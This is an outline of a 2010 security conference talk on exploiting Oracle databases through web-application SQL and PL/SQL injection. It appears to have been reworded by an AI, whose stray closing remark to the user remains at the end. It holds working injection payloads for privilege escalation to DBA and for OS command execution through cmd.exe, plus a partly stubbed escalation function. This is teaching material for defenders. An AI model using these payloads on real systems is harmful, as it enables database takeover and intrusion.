### Presentation: Hacking Oracle from Web Applications

#### Presenter
- **Dan Haagman**
  - InfoSecurity 2009
  - Penetration Tester at 7Safe, UK
  - Specializes in Application Security
  - Speaker at Defcon, OWASP Appsec, Troopers, Sec-T, etc.
  - Not an Oracle expert

#### Company Overview
- **7Safe**
  - Secure Coding Course, © 7Safe
  - Date: 6/11/2010

#### Agenda
1. **Introduction** (5 mins)
2. **PL/SQL vs SQL Injection** (5 mins)
3. **Extracting Data** (5 mins)
4. **Privilege Escalation** (5 mins)
5. **OS Code Execution** (15 mins)
6. **Second Order Attacks** (10 mins)
7. **PCI Compliance and SQL Injection** (10 mins)

#### About the Talk
- This presentation will cover the work of several Oracle security researchers, particularly David Litchfield, in the context of web application security.
- Acknowledgments:
  - Alexander Kornbrust
  - Ferruh Mavituna

#### Oracle Privileges
- **Default Packages and Procedures:**
  - Oracle database installations come with a number of default packages, procedures, and functions.
  - By default, these run with the privilege of the definer.
  - To change the execution privileges to the invoker, the `AUTHID CURRENT_USER` keyword must be defined.

#### Exploiting Oracle from Internal Networks
- **Scenario:**
  - If there is a SQL injection in a procedure owned by SYS and PUBLIC has execute privileges, it can lead to a significant security breach.
- **Steps:**
  1. Enumerate SID
  2. Enumerate users
  3. Connect to Oracle
  4. Exploit SQL injection in a procedure owned by SYS
  5. Become DBA
  6. Execute OS code
  7. Use Metasploit for further exploitation

#### Example
- **Code:**
  ```sql
  exec SYS.LT.MERGEWORKSPACE('foobar' and SCOTT.DBA()='Y');
  ```
  - The function `SCOTT.DBA()` will be executed by SYS as it is called by the procedure.
  - `SCOTT.DBA()` has `AUTHID CURRENT_USER` defined.

#### PL/SQL vs SQL
- **PL/SQL:**
  - A coding language embedded in Oracle.
  - Allows for free-floating code wrapped between `BEGIN` and `END`.
  - Example:
    ```plsql
    BEGIN
      Scott.procedure1('input1');
      Scott.procedure2('input2');
    END;
    ```
- **SQL:**
  - A limited language for direct interaction with the database.
  - Supports queries (SELECT), data manipulation (DDL, DML).
  - Does not include loops or IF...THEN...ELSE statements.
  - Does not support multiple statement execution.

#### Challenges in Exploiting Oracle from Web Apps
- **Challenges:**
  - Limited documentation on exploits that can be used from web applications.
  - Few publicly available tools for exploiting Oracle SQL injections.

#### Types of Vulnerabilities
- **PL/SQL Injection:**
  - Injection in anonymous PL/SQL blocks.
  - No restrictions, can execute DDL and DML.
  - Easy to exploit.
- **SQL Injection:**
  - Injection in a single SQL statement.
  - Restrictions apply, no semicolons allowed.
  - More difficult to exploit.

#### Example of PL/SQL Injection
- **PHP Code at Web Server:**
  - At the database:
    ```sql
    CREATE OR REPLACE PROCEDURE SCOTT.TEST(Q IN VARCHAR2) AS
    BEGIN
      EXECUTE IMMEDIATE ('BEGIN ' || Q || '; END;');
    END;
    ```

#### DBMS_JVM_EXP_PERMS Exploit
- **Exploit:**
  - Demonstrated by David Litchfield at Blackhat DC, 2010.
  - Allows a user with create session privileges to grant themselves Java IO permissions.
  - Once Java IO permissions are obtained, the user can become a DBA or directly execute OS code.
  - Fixed in April 2010 CPU.

#### Privilege Escalation
- **Example:**
  ```sql
  http://192.168.2.10/ora9.php?name=NULL; 
  execute immediate 'DECLARE POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY; CURSOR C1 IS SELECT ''GRANT'',user(),''SYS'',''java.io.FilePermission'',''>'',''execute'',''ENABLED'' FROM DUAL; BEGIN OPEN C1; FETCH C1 BULK COLLECT INTO POL; CLOSE C1; DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL); END;';
  ```

#### OS Code Execution
- **Example:**
  ```sql
  http://192.168.2.10/ora9.php?name=null; 
  declare aa varchar2(200); begin execute immediate 'Select DBMS_JAVA_TEST.FUNCALL(''oracle/aurora/util/Wrapper'',''main'',''c:\\windows\\system32\\cmd.exe'',''/c'',''dir >> c:\\0wned.txt'') FROM DUAL' into aa; end; end;--
  ```

#### PL/SQL in Oracle Apps
- **Vulnerabilities:**
  - Oracle Portal component in Oracle Application Server 9.0.4.3, 10.1.2.2, and 10.1.4.1.
  - CVE ID: 2008-2589: WWV_RENDER_REPORT package’s SHOW procedure vulnerable to PL/SQL injection.
  - CPU, July 2008: PL/SQL Injection in Oracle Application Server (WWEXP_API_ENGINE).

#### Becoming DBA from Execute "Any" Procedure Privilege
- **Execute "Any" Procedure:**
  - High privilege, but not equivalent to DBA.
  - SQL Injection in `mdsys.reset_inprog_index()` procedure.
  - Mdsys has create any trigger privilege, which can give us DBA.
  - Public does not have execute privileges on `mdsys.reset_inprog_index()` by default.

#### Indirect Privilege Escalation
- **Example:**
  ```sql
  CREATE OR REPLACE FUNCTION scott.z RETURN INT AS
  BEGIN
    EXECUTE IMMEDIATE 'grant dba to scott';
    RETURN 1;
  END;

  GRANT EXECUTE ON scott.fn2 TO PUBLIC;

  CREATE OR REPLACE FUNCTION fn2 RETURN INT AUTHID CURRENT_USER IS
  PRAGMA AUTONOMOUS_TRANSACTION;
  BEGIN
    -- Additional logic here
  END;
  ```

This optimized version of your text provides a clear, structured, and professional overview of the presentation, making it easier for the audience to follow and understand the key points.